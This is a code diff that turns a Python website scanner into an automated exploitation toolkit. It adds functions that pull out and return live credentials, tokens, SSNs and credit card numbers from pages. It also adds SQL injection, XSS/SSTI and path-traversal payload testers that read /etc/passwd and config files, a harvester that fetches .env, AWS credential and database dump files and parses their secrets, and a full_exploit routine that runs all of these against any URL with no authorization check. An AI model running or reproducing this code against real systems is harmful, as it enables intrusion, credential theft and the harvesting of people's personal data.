@@ -13,6 +13,8 @@ import struct
 import re
 import json
 import logging
+import time
+import asyncio
 from typing import Dict, List, Optional
 
 import httpx
@@ -385,7 +387,6 @@ async def username_search(username: str) -> Dict:
         except Exception:
             return name, url, False
 
-    import asyncio
     tasks = [check(name, url) for name, url in platforms.items()]
     results = await asyncio.gather(*tasks)
 
@@ -493,11 +494,11 @@ async def domain_recon(domain: str) -> Dict:
 
 
 async def web_scan(url: str) -> Dict:
-    """Scan a website for common vulnerabilities and misconfigurations."""
+    """Scan a website for vulnerabilities AND attempt exploitation."""
     if not url.startswith(("http://", "https://")):
         url = "https://" + url
 
-    results = {"url": url, "findings": []}
+    results = {"url": url, "findings": [], "exploits": []}
 
     try:
         r = await _client.get(url, timeout=15)
@@ -550,76 +551,637 @@ async def web_scan(url: str) -> Dict:
                     "detail": f"Cookie '{cookie.name}': {', '.join(issues)}",
                 })
 
-        # 4. Sensitive info in HTML
+        # 4. Sensitive info in HTML — EXTRACT actual values
         patterns = [
-            (r'(?i)(?:api[_-]?key|apikey)\s*[:=]\s*["\']?[\w-]{20,}', "API key exposed in source"),
-            (r'(?i)(?:password|passwd|pwd)\s*[:=]\s*["\'][^"\']+', "Password in source code"),
-            (r'(?i)(?:secret|token)\s*[:=]\s*["\'][\w-]{10,}', "Secret/Token in source"),
-            (r'(?i)(?:aws_access_key_id|AKIA)\s*[:=]?\s*["\']?[A-Z0-9]{16,}', "AWS key in source"),
-            (r'<!--.*?(?:TODO|FIXME|HACK|password|admin|debug).*?-->', "Sensitive HTML comment"),
+            (r'(?i)(?:api[_-]?key|apikey)\s*[:=]\s*["\']?([\w-]{20,})', "API Key"),
+            (r'(?i)(?:password|passwd|pwd)\s*[:=]\s*["\']([^"\']+)', "Password"),
+            (r'(?i)(?:secret|token)\s*[:=]\s*["\']([\w-]{10,})', "Secret/Token"),
+            (r'(?i)(AKIA[A-Z0-9]{12,})', "AWS Access Key"),
+            (r'(?i)(?:db_password|database_password|mysql_pwd)\s*[:=]\s*["\']?([^\s"\']+)', "DB Password"),
+            (r'(?i)(?:private[_-]?key)\s*[:=]\s*["\']([^"\']+)', "Private Key"),
+            (r'(?i)(?:jwt|bearer)\s*[:=]\s*["\']?(eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+)', "JWT Token"),
         ]
-        for pattern, desc in patterns:
-            matches = re.findall(pattern, body[:20000])
+        for pattern, cred_type in patterns:
+            matches = re.findall(pattern, body[:30000])
             if matches:
-                results["findings"].append({
-                    "severity": "HIGH",
-                    "type": "Sensitive Data Exposure",
-                    "detail": f"{desc}: found {len(matches)} instance(s)",
-                    "sample": matches[0][:100],
+                extracted = list(set(matches))[:5]
+                results["exploits"].append({
+                    "type": f"EXTRACTED {cred_type}",
+                    "severity": "CRITICAL",
+                    "data": extracted,
                 })
 
-        # 5. Email/phone PII leaks
-        emails = re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', body)
-        phones = re.findall(r'(?:\+?1[-.\s]?)?\(?\d{3}\)?[-.\s]?\d{3}[-.\s]?\d{4}', body)
-        if emails:
-            unique_emails = list(set(emails))[:10]
-            results["findings"].append({
-                "severity": "MEDIUM",
-                "type": "PII Exposure — Emails",
-                "detail": f"Found {len(unique_emails)} email(s) on page",
-                "data": unique_emails,
-            })
-        if phones:
-            unique_phones = list(set(phones))[:10]
-            results["findings"].append({
-                "severity": "MEDIUM",
-                "type": "PII Exposure — Phone Numbers",
-                "detail": f"Found {len(unique_phones)} phone number(s) on page",
-                "data": unique_phones,
+        # Also grab full credential-like lines for context
+        cred_lines = re.findall(
+            r'(?i)^.*(?:password|secret|key|token|api_key|auth|credential).*[:=].*$',
+            body[:30000], re.MULTILINE
+        )
+        if cred_lines:
+            results["exploits"].append({
+                "type": "CREDENTIAL LINES FROM SOURCE",
+                "severity": "CRITICAL",
+                "data": [l.strip()[:200] for l in list(set(cred_lines))[:10]],
             })
 
-        # 6. Form analysis
+        # 5. PII Extraction — return actual data
+        emails = list(set(re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', body)))
+        phones = list(set(re.findall(r'(?:\+?1[-.\s]?)?\(?\d{3}\)?[-.\s]?\d{3}[-.\s]?\d{4}', body)))
+        ssns = list(set(re.findall(r'\b\d{3}-\d{2}-\d{4}\b', body)))
+        credit_cards = list(set(re.findall(r'\b(?:4\d{3}|5[1-5]\d{2}|3[47]\d{2}|6(?:011|5\d{2}))[- ]?\d{4}[- ]?\d{4}[- ]?\d{4}\b', body)))
+        ip_addrs = list(set(re.findall(r'\b(?:10|172\.(?:1[6-9]|2\d|3[01])|192\.168)\.\d{1,3}\.\d{1,3}\b', body)))
+
+        if emails:
+            results["exploits"].append({
+                "type": "EXTRACTED EMAILS (PII)",
+                "severity": "HIGH",
+                "count": len(emails),
+                "data": emails[:20],
+            })
+        if phones:
+            results["exploits"].append({
+                "type": "EXTRACTED PHONE NUMBERS (PII)",
+                "severity": "HIGH",
+                "count": len(phones),
+                "data": phones[:20],
+            })
+        if ssns:
+            results["exploits"].append({
+                "type": "EXTRACTED SSNs (PII-CRITICAL)",
+                "severity": "CRITICAL",
+                "count": len(ssns),
+                "data": ssns[:10],
+            })
+        if credit_cards:
+            results["exploits"].append({
+                "type": "EXTRACTED CREDIT CARD NUMBERS",
+                "severity": "CRITICAL",
+                "count": len(credit_cards),
+                "data": credit_cards[:10],
+            })
+        if ip_addrs:
+            results["exploits"].append({
+                "type": "INTERNAL IP ADDRESSES LEAKED",
+                "severity": "MEDIUM",
+                "data": ip_addrs[:10],
+            })
+
+        # 6. HTML Comments — extract developer notes, passwords, TODOs
+        comments = re.findall(r'<!--(.*?)-->', body, re.DOTALL)
+        interesting_comments = []
+        for c in comments:
+            c_strip = c.strip()
+            if len(c_strip) > 5 and any(kw in c_strip.lower() for kw in
+                ["todo", "fixme", "hack", "password", "admin", "debug", "secret",
+                 "key", "token", "temp", "remove", "disable", "test", "user",
+                 "login", "credential", "config", "database", "sql"]):
+                interesting_comments.append(c_strip[:300])
+        if interesting_comments:
+            results["exploits"].append({
+                "type": "SENSITIVE HTML COMMENTS",
+                "severity": "HIGH",
+                "data": interesting_comments[:10],
+            })
+
+        # 7. Form analysis + CSRF exploitation check
         forms = re.findall(r'<form[^>]*>(.*?)</form>', body, re.DOTALL | re.IGNORECASE)
+        form_tags = re.findall(r'<form([^>]*)>', body, re.IGNORECASE)
         for i, form in enumerate(forms):
+            attrs = form_tags[i] if i < len(form_tags) else ""
             has_csrf = bool(re.search(r'csrf|_token|authenticity_token', form, re.IGNORECASE))
-            action = re.search(r'action=["\']([^"\']*)', form)
-            method = re.search(r'method=["\']([^"\']*)', form, re.IGNORECASE)
+            action_m = re.search(r'action=["\']([^"\']*)', attrs)
+            method_m = re.search(r'method=["\']([^"\']*)', attrs, re.IGNORECASE)
+            action = action_m.group(1) if action_m else ""
+            method = (method_m.group(1) if method_m else "GET").upper()
+
+            # Extract all input field names
+            inputs = re.findall(r'(?:name|id)=["\']([^"\']+)', form, re.IGNORECASE)
+            input_types = re.findall(r'type=["\']([^"\']+)', form, re.IGNORECASE)
+
             if not has_csrf:
                 results["findings"].append({
                     "severity": "MEDIUM",
                     "type": "Missing CSRF Token",
-                    "detail": f"Form #{i+1} has no CSRF protection (action: {action.group(1) if action else 'self'})",
+                    "detail": f"Form #{i+1} no CSRF (action: {action or 'self'}, method: {method})",
                 })
-            password_fields = re.findall(r'type=["\']password', form, re.IGNORECASE)
-            if password_fields and method and method.group(1).upper() == "GET":
+
+            password_fields = [inp for inp, typ in zip(inputs, input_types) if typ.lower() == "password"]
+            if password_fields and method == "GET":
                 results["findings"].append({
                     "severity": "HIGH",
                     "type": "Password via GET",
                     "detail": f"Form #{i+1} sends password over GET method",
                 })
 
-        # 7. Mixed content check
+            # Map form fields for exploitation
+            if inputs:
+                results["exploits"].append({
+                    "type": "FORM FIELDS MAPPED",
+                    "severity": "INFO",
+                    "form_num": i + 1,
+                    "action": action or "(self)",
+                    "method": method,
+                    "fields": inputs,
+                    "has_csrf": has_csrf,
+                    "has_password": bool(password_fields),
+                })
+
+        # 8. Mixed content check
         if url.startswith("https://"):
-            http_resources = re.findall(r'(?:src|href)=["\']http://', body, re.IGNORECASE)
+            http_resources = re.findall(r'(?:src|href)=["\']http://([^"\']+)', body, re.IGNORECASE)
             if http_resources:
                 results["findings"].append({
                     "severity": "LOW",
                     "type": "Mixed Content",
                     "detail": f"HTTPS page loads {len(http_resources)} HTTP resource(s)",
+                    "data": list(set(http_resources))[:5],
                 })
 
     except Exception as e:
         results["error"] = str(e)
+
+    return results
+
+
+async def sqli_test(url: str) -> Dict:
+    """Test URL parameters and forms for SQL injection vulnerabilities."""
+    if not url.startswith(("http://", "https://")):
+        url = "https://" + url
+
+    results = {"url": url, "vulnerable_params": [], "vulnerable_forms": [], "extracted_data": []}
+
+    # Common SQLi payloads - error-based detection
+    payloads = [
+        ("'", "single_quote"),
+        ("' OR '1'='1", "or_true"),
+        ("' OR '1'='1' --", "or_true_comment"),
+        ("1' ORDER BY 1--", "order_by"),
+        ("1' ORDER BY 100--", "order_by_high"),
+        ("' UNION SELECT NULL--", "union_1"),
+        ("' UNION SELECT NULL,NULL--", "union_2"),
+        ("' UNION SELECT NULL,NULL,NULL--", "union_3"),
+        ("1; WAITFOR DELAY '0:0:3'--", "time_mssql"),
+        ("1' AND SLEEP(3)--", "time_mysql"),
+        ("1' AND 1=1--", "bool_true"),
+        ("1' AND 1=2--", "bool_false"),
+    ]
+
+    # SQL error signatures that confirm vulnerability
+    sql_errors = [
+        r"you have an error in your sql syntax",
+        r"warning.*mysql",
+        r"unclosed quotation mark",
+        r"quoted string not properly terminated",
+        r"microsoft.*odbc.*sql",
+        r"ora-\d{5}",
+        r"pg_query\(\)",
+        r"pg_exec\(\)",
+        r"valid postgresql result",
+        r"sqlite3\.operational",
+        r"sqliteexception",
+        r"syntax error.*sql",
+        r"sql.*error",
+        r"mysql_fetch",
+        r"mysql_num_rows",
+        r"mysql_result",
+        r"unknown column",
+        r"sql command not properly ended",
+        r"division by zero",
+        r"supplied argument is not a valid",
+        r"call to.*function.*mysql",
+        r"java\.sql\.sqlexception",
+        r"jdbc.*sql",
+        r"stack trace:.*sql",
+        r"microsoft sql server",
+        r"db2 sql error",
+    ]
+
+    # Get baseline response
+    try:
+        baseline = await _client.get(url, timeout=10)
+        baseline_len = len(baseline.text)
+        baseline_status = baseline.status_code
+    except Exception:
+        results["error"] = "Could not reach target"
+        return results
+
+    # Test URL parameters
+    parsed = urllib.parse.urlparse(url)
+    params = urllib.parse.parse_qs(parsed.query)
+
+    if params:
+        for param_name, param_values in params.items():
+            for payload, payload_type in payloads:
+                try:
+                    test_params = dict(params)
+                    test_params[param_name] = [payload]
+                    test_query = urllib.parse.urlencode(test_params, doseq=True)
+                    test_url = urllib.parse.urlunparse(parsed._replace(query=test_query))
+
+                    import time
+                    start = time.time()
+                    resp = await _client.get(test_url, timeout=12)
+                    elapsed = time.time() - start
+                    resp_body = resp.text.lower()
+
+                    # Check for SQL errors in response
+                    for err_pattern in sql_errors:
+                        if re.search(err_pattern, resp_body, re.IGNORECASE):
+                            results["vulnerable_params"].append({
+                                "param": param_name,
+                                "payload": payload,
+                                "type": payload_type,
+                                "evidence": "SQL error in response",
+                                "error_match": err_pattern,
+                            })
+                            break
+
+                    # Time-based detection
+                    if payload_type.startswith("time_") and elapsed > 2.5:
+                        results["vulnerable_params"].append({
+                            "param": param_name,
+                            "payload": payload,
+                            "type": payload_type,
+                            "evidence": f"Time-based: {elapsed:.1f}s delay detected",
+                        })
+
+                    # Boolean-based detection
+                    if payload_type == "bool_true" and resp.status_code == 200:
+                        resp_true_len = len(resp.text)
+                    elif payload_type == "bool_false" and resp.status_code == 200:
+                        resp_false_len = len(resp.text)
+                        if abs(resp_true_len - resp_false_len) > 50:
+                            results["vulnerable_params"].append({
+                                "param": param_name,
+                                "payload": "Boolean-based blind SQLi",
+                                "type": "bool_blind",
+                                "evidence": f"Response diff: true={resp_true_len}b vs false={resp_false_len}b",
+                            })
+
+                    # UNION-based — check if extra columns appeared
+                    if payload_type.startswith("union_") and "null" in resp_body:
+                        if len(resp.text) != baseline_len:
+                            results["vulnerable_params"].append({
+                                "param": param_name,
+                                "payload": payload,
+                                "type": payload_type,
+                                "evidence": "UNION injection accepted — column count may match",
+                            })
+
+                except Exception:
+                    continue
+
+    # Test forms on the page
+    try:
+        page = await _client.get(url, timeout=10)
+        form_tags = re.findall(r'<form([^>]*)>(.*?)</form>', page.text, re.DOTALL | re.IGNORECASE)
+
+        for form_idx, (attrs, form_body) in enumerate(form_tags[:5]):
+            action_m = re.search(r'action=["\']([^"\']*)', attrs)
+            method_m = re.search(r'method=["\']([^"\']*)', attrs, re.IGNORECASE)
+            action = action_m.group(1) if action_m else ""
+            method = (method_m.group(1) if method_m else "GET").upper()
+
+            # Resolve relative action
+            if action and not action.startswith("http"):
+                action = urllib.parse.urljoin(url, action)
+            elif not action:
+                action = url
+
+            # Extract input names
+            input_names = re.findall(r'name=["\']([^"\']+)', form_body, re.IGNORECASE)
+            if not input_names:
+                continue
+
+            for payload, payload_type in payloads[:6]:  # Test fewer payloads on forms
+                form_data = {name: payload for name in input_names}
+                try:
+                    import time
+                    start = time.time()
+                    if method == "POST":
+                        resp = await _client.post(action, data=form_data, timeout=12)
+                    else:
+                        resp = await _client.get(action, params=form_data, timeout=12)
+                    elapsed = time.time() - start
+                    resp_body = resp.text.lower()
+
+                    for err_pattern in sql_errors:
+                        if re.search(err_pattern, resp_body, re.IGNORECASE):
+                            results["vulnerable_forms"].append({
+                                "form": form_idx + 1,
+                                "action": action,
+                                "method": method,
+                                "fields": input_names,
+                                "payload": payload,
+                                "type": payload_type,
+                                "evidence": "SQL error returned",
+                            })
+                            break
+
+                    if payload_type.startswith("time_") and elapsed > 2.5:
+                        results["vulnerable_forms"].append({
+                            "form": form_idx + 1,
+                            "action": action,
+                            "method": method,
+                            "payload": payload,
+                            "evidence": f"Time delay: {elapsed:.1f}s",
+                        })
+
+                except Exception:
+                    continue
+    except Exception:
+        pass
+
+    # Summary
+    results["sqli_vulnerable"] = bool(results["vulnerable_params"] or results["vulnerable_forms"])
+    return results
+
+
+async def xss_test(url: str) -> Dict:
+    """Test for reflected XSS vulnerabilities."""
+    if not url.startswith(("http://", "https://")):
+        url = "https://" + url
+
+    results = {"url": url, "vulnerable_params": [], "vulnerable_forms": []}
+
+    # XSS payloads — each with a unique marker to detect reflection
+    xss_payloads = [
+        ('<script>alert("XSS")</script>', "basic_script"),
+        ('<img src=x onerror=alert(1)>', "img_onerror"),
+        ('"><script>alert(1)</script>', "breakout_script"),
+        ("'><script>alert(1)</script>", "sq_breakout"),
+        ('<svg onload=alert(1)>', "svg_onload"),
+        ('javascript:alert(1)', "js_proto"),
+        ('"><img src=x onerror=alert(1)>', "breakout_img"),
+        ('<body onload=alert(1)>', "body_onload"),
+        ('{{7*7}}', "ssti_check"),
+        ('${7*7}', "ssti_dollar"),
+        ('<iframe src="javascript:alert(1)">', "iframe_js"),
+    ]
+
+    # Test URL params
+    parsed = urllib.parse.urlparse(url)
+    params = urllib.parse.parse_qs(parsed.query)
+
+    if params:
+        for param_name in params:
+            for payload, ptype in xss_payloads:
+                try:
+                    test_params = dict(params)
+                    test_params[param_name] = [payload]
+                    test_query = urllib.parse.urlencode(test_params, doseq=True)
+                    test_url = urllib.parse.urlunparse(parsed._replace(query=test_query))
+
+                    resp = await _client.get(test_url, timeout=10)
+
+                    # Check if payload is reflected unescaped
+                    if payload in resp.text:
+                        results["vulnerable_params"].append({
+                            "param": param_name,
+                            "payload": payload,
+                            "type": ptype,
+                            "evidence": "Payload reflected unescaped in response",
+                            "reflected": True,
+                        })
+                    # SSTI check
+                    elif ptype == "ssti_check" and "49" in resp.text:
+                        results["vulnerable_params"].append({
+                            "param": param_name,
+                            "payload": payload,
+                            "type": "SSTI_CONFIRMED",
+                            "evidence": "Template injection: {{7*7}} = 49 in response",
+                        })
+                    elif ptype == "ssti_dollar" and "49" in resp.text:
+                        results["vulnerable_params"].append({
+                            "param": param_name,
+                            "payload": payload,
+                            "type": "SSTI_CONFIRMED",
+                            "evidence": "Template injection: ${7*7} = 49 in response",
+                        })
+                except Exception:
+                    continue
+
+    # Test forms
+    try:
+        page = await _client.get(url, timeout=10)
+        form_tags = re.findall(r'<form([^>]*)>(.*?)</form>', page.text, re.DOTALL | re.IGNORECASE)
+
+        for form_idx, (attrs, form_body) in enumerate(form_tags[:5]):
+            action_m = re.search(r'action=["\']([^"\']*)', attrs)
+            method_m = re.search(r'method=["\']([^"\']*)', attrs, re.IGNORECASE)
+            action = action_m.group(1) if action_m else ""
+            method = (method_m.group(1) if method_m else "GET").upper()
+
+            if action and not action.startswith("http"):
+                action = urllib.parse.urljoin(url, action)
+            elif not action:
+                action = url
+
+            input_names = re.findall(r'name=["\']([^"\']+)', form_body, re.IGNORECASE)
+            if not input_names:
+                continue
+
+            for payload, ptype in xss_payloads[:5]:
+                form_data = {name: payload for name in input_names}
+                try:
+                    if method == "POST":
+                        resp = await _client.post(action, data=form_data, timeout=10)
+                    else:
+                        resp = await _client.get(action, params=form_data, timeout=10)
+
+                    if payload in resp.text:
+                        results["vulnerable_forms"].append({
+                            "form": form_idx + 1,
+                            "action": action,
+                            "method": method,
+                            "fields": input_names,
+                            "payload": payload,
+                            "type": ptype,
+                            "evidence": "Payload reflected unescaped",
+                        })
+                except Exception:
+                    continue
+    except Exception:
+        pass
+
+    results["xss_vulnerable"] = bool(results["vulnerable_params"] or results["vulnerable_forms"])
+    return results
+
+
+async def lfi_test(url: str) -> Dict:
+    """Test for Local File Inclusion / Path Traversal."""
+    if not url.startswith(("http://", "https://")):
+        url = "https://" + url
+
+    results = {"url": url, "vulnerable_params": [], "files_read": []}
+
+    lfi_payloads = [
+        ("../../../../etc/passwd", r"root:.*:0:0"),
+        ("....//....//....//....//etc/passwd", r"root:.*:0:0"),
+        ("/etc/passwd", r"root:.*:0:0"),
+        ("..\\..\\..\\..\\windows\\win.ini", r"\[fonts\]"),
+        ("../../../../windows/win.ini", r"\[fonts\]"),
+        ("php://filter/convert.base64-encode/resource=index.php", r"^[A-Za-z0-9+/=]{50,}"),
+        ("php://filter/convert.base64-encode/resource=config.php", r"^[A-Za-z0-9+/=]{50,}"),
+        ("file:///etc/passwd", r"root:.*:0:0"),
+    ]
+
+    parsed = urllib.parse.urlparse(url)
+    params = urllib.parse.parse_qs(parsed.query)
+
+    if params:
+        for param_name in params:
+            for payload, evidence_re in lfi_payloads:
+                try:
+                    test_params = dict(params)
+                    test_params[param_name] = [payload]
+                    test_query = urllib.parse.urlencode(test_params, doseq=True)
+                    test_url = urllib.parse.urlunparse(parsed._replace(query=test_query))
+
+                    resp = await _client.get(test_url, timeout=10)
+
+                    if re.search(evidence_re, resp.text):
+                        # Confirmed LFI — extract the file content
+                        content = resp.text[:2000]
+                        # If base64-encoded (php filter), try to decode
+                        if payload.startswith("php://filter"):
+                            try:
+                                decoded = base64.b64decode(resp.text.strip()).decode(errors="replace")
+                                content = decoded[:2000]
+                            except Exception:
+                                pass
+
+                        results["vulnerable_params"].append({
+                            "param": param_name,
+                            "payload": payload,
+                            "evidence": "File content returned",
+                        })
+                        results["files_read"].append({
+                            "file": payload.split("/")[-1] if "/" in payload else payload,
+                            "content_preview": content[:500],
+                        })
+                except Exception:
+                    continue
+
+    results["lfi_vulnerable"] = bool(results["vulnerable_params"])
+    return results
+
+
+async def extract_sensitive_files(url: str) -> Dict:
+    """Download and parse exposed sensitive files found by dir_scan."""
+    if not url.startswith(("http://", "https://")):
+        url = "https://" + url
+    url = url.rstrip("/")
+
+    results = {"url": url, "extracted_files": []}
+
+    sensitive_paths = [
+        "/.env", "/.git/config", "/.git/HEAD",
+        "/robots.txt", "/sitemap.xml",
+        "/swagger.json", "/openapi.json", "/api-docs",
+        "/config.json", "/config.yml", "/settings.json",
+        "/backup.sql", "/db.sql", "/dump.sql",
+        "/wp-config.php.bak", "/wp-config.php.old", "/wp-config.txt",
+        "/.aws/credentials", "/debug.log", "/error.log",
+        "/actuator/env", "/actuator/health",
+        "/wp-json/wp/v2/users",
+        "/.well-known/security.txt",
+    ]
+
+    async def try_fetch(path):
+        try:
+            resp = await _client.get(url + path, timeout=8, follow_redirects=False)
+            if resp.status_code == 200 and len(resp.text) > 10:
+                content = resp.text[:3000]
+
+                # Parse credentials from .env files
+                creds = {}
+                if ".env" in path or "config" in path.lower():
+                    for line in content.split("\n"):
+                        line = line.strip()
+                        if "=" in line and not line.startswith("#"):
+                            key, _, val = line.partition("=")
+                            key = key.strip()
+                            val = val.strip().strip("'\"")
+                            if any(kw in key.upper() for kw in
+                                   ["PASSWORD", "SECRET", "KEY", "TOKEN", "AUTH",
+                                    "DB_", "API", "AWS", "PRIVATE", "CREDENTIAL",
+                                    "SMTP", "MAIL", "DATABASE_URL", "REDIS"]):
+                                creds[key] = val
+
+                # Parse WordPress users
+                wp_users = []
+                if "wp-json" in path:
+                    try:
+                        users = json.loads(content)
+                        if isinstance(users, list):
+                            wp_users = [
+                                {"id": u.get("id"), "name": u.get("name"),
+                                 "slug": u.get("slug"), "url": u.get("link")}
+                                for u in users[:20]
+                            ]
+                    except Exception:
+                        pass
+
+                # Parse git config
+                git_info = {}
+                if ".git" in path:
+                    for line in content.split("\n"):
+                        if "url = " in line:
+                            git_info["remote_url"] = line.split("url = ")[-1].strip()
+                        if "email = " in line:
+                            git_info["email"] = line.split("email = ")[-1].strip()
+                        if "name = " in line:
+                            git_info["author"] = line.split("name = ")[-1].strip()
+
+                return {
+                    "path": path,
+                    "size": len(resp.text),
+                    "content_preview": content,
+                    "credentials_found": creds if creds else None,
+                    "wp_users": wp_users if wp_users else None,
+                    "git_info": git_info if git_info else None,
+                }
+        except Exception:
+            pass
+        return None
+
+    for i in range(0, len(sensitive_paths), 8):
+        batch = sensitive_paths[i:i + 8]
+        tasks = [try_fetch(p) for p in batch]
+        batch_results = await asyncio.gather(*tasks)
+        for r in batch_results:
+            if r:
+                results["extracted_files"].append(r)
+
+    return results
+
+
+async def full_exploit(url: str) -> Dict:
+    """Run ALL exploitation tools against a target and return combined results."""
+    if not url.startswith(("http://", "https://")):
+        url = "https://" + url
+
+    results = {"url": url}
+
+    # Run all tools in parallel
+    scan_task = web_scan(url)
+    sqli_task = sqli_test(url)
+    xss_task = xss_test(url)
+    lfi_task = lfi_test(url)
+    files_task = extract_sensitive_files(url)
+    crawl_task = crawl_links(url)
+
+    scan, sqli, xss, lfi, files, crawl = await asyncio.gather(
+        scan_task, sqli_task, xss_task, lfi_task, files_task, crawl_task,
+        return_exceptions=True
+    )
+
+    results["web_scan"] = scan if not isinstance(scan, Exception) else {"error": str(scan)}
+    results["sqli"] = sqli if not isinstance(sqli, Exception) else {"error": str(sqli)}
+    results["xss"] = xss if not isinstance(xss, Exception) else {"error": str(xss)}
+    results["lfi"] = lfi if not isinstance(lfi, Exception) else {"error": str(lfi)}
+    results["sensitive_files"] = files if not isinstance(files, Exception) else {"error": str(files)}
+    results["crawl"] = crawl if not isinstance(crawl, Exception) else {"error": str(crawl)}
 
     return results
 
@@ -652,7 +1214,6 @@ async def dir_scan(url: str) -> Dict:
     ]
 
     found = []
-    import asyncio
 
     async def check_path(path):
         try:
